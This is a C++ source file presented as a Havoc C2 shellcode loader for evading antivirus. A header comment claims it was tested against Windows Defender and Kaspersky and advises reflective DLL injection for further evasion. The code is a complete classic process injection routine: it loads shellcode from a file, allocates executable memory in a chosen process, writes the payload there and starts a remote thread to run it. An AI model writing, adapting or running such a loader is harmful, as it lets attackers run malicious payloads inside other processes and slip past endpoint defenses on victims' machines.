/*havoc shell code loader to bypass AV 
this shellcode loader tast on Windows Defender and KasperSky
to bypass kaspersky you must change your Porcess Injection Process
the Process Injection has been Detected by the KasperSky so You Must Change your strategy like using DLL To bypass kasperSKY 
like using Reflective DLL injection without Write AnyThing on the Disk
Reflective DLL Injection Source : https://www.youtube.com/watch?v=teWLAUxGmTg
*/

#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <sstream>
#include <string>

std::vector<unsigned char> readShellcodeFromFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);  // Open file in binary mode
    std::vector<unsigned char> shellcode;

    if (!file) {
        std::cerr << "[!] Failed to open file: " << filename << std::endl;
        return shellcode;
    }

    // Read the entire content of the file into the vector
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    shellcode.resize(fileSize);
    file.read(reinterpret_cast<char*>(shellcode.data()), fileSize);

    return shellcode;
}

int injectShellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[!] Failed to open process: " << pid << std::endl;
        return 1;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "[!] VirtualAllocEx failed\n";
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcode.size(), nullptr)) {
        std::cerr << "[!] WriteProcessMemory failed\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[!] CreateRemoteThread failed\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[*] Shellcode executed in process " << pid << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

// Convert string to DWORD using stringstream
DWORD convertToDWORD(const std::string& str) {
    std::stringstream ss(str);
    DWORD pid = 0;
    ss >> pid;
    return pid;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <pid> <shellcode_file>\n";
        return 1;
    }

    DWORD pid = convertToDWORD(argv[1]); // Convert argument to DWORD
    std::vector<unsigned char> shellcode = readShellcodeFromFile(argv[2]);

    if (shellcode.empty()) {
        std::cerr << "[!] No shellcode found.\n";
        return 1;
    }

    return injectShellcode(pid, shellcode);
}
